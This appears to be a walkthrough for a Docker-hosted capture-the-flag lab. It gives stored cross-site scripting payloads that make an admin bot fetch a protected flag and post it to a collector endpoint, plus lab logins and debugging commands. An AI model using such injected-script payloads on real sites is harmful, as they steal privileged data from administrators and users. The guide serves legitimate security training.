# Test Your Payload

## Step 1: Verify Your User ID

First, test if your user_id is correct. Use this simple payload:

```html
<script>
fetch('/collector', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ user_id: 1, data: 'TEST_MESSAGE_USER_1' })
});
</script>
```

**Instructions:**
1. Login as `tokyo` / `rio123`
2. Go to "Send Message"
3. Paste the payload above in the **Message** field
4. Submit
5. Wait 15-20 seconds
6. Go to "Intercepted Data" (`/my-captures`)
7. If you see "TEST_MESSAGE_USER_1", your user_id is **1** ✓
8. If you don't see it, try `user_id: 2` in the payload and repeat

## Step 2: Test Flag Fetching

Once you know your user_id, test if you can fetch the flag:

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    console.log('Flag received:', flag);
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: 'FLAG_TEST: ' + flag })
    });
  })
  .catch(e => console.error('Error:', e));
</script>
```

**Replace `user_id: 1` with your actual user_id from Step 1.**

## Step 3: Full Payload

Once Steps 1 and 2 work, use the complete payload:

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

**Replace `user_id: 1` with your actual user_id.**

## Common Issues

### Issue: Nothing appears in Intercepted Data
- **Check:** Did you wait at least 15-20 seconds after submitting?
- **Check:** Is the bot running? `sudo docker-compose logs admin-bot`
- **Check:** Look for `[professor-bot] Detected request` in bot logs

### Issue: Test message works but flag doesn't
- **Check:** Is the FLAG environment variable set? `sudo docker-compose exec web printenv FLAG`
- **Check:** Look for `[collector] Flag detected` in web server logs
- **Check:** The flag should start with `FLAG{`

### Issue: Wrong user_id
- **Solution:** Use Step 1 to find your correct user_id
- Tokyo is usually user_id 1, but if you created other accounts, it might be different

### Issue: Script not executing
- **Check:** Make sure you're pasting the payload in the **Message** field (not Subject)
- **Check:** Don't add any extra spaces or line breaks
- **Check:** Copy-paste the exact payload (no typos)

## Debugging Commands

```bash
# Check bot logs
sudo docker-compose logs admin-bot --tail 50 -f

# Check web server logs
sudo docker-compose logs web --tail 50 -f

# Check if flag is set
sudo docker-compose exec web printenv FLAG

# Check database captures
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT * FROM captures ORDER BY id DESC LIMIT 5;"

# Check tickets
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT id, user_id, LEFT(message, 50) as message_preview FROM tickets ORDER BY id DESC LIMIT 5;"
```

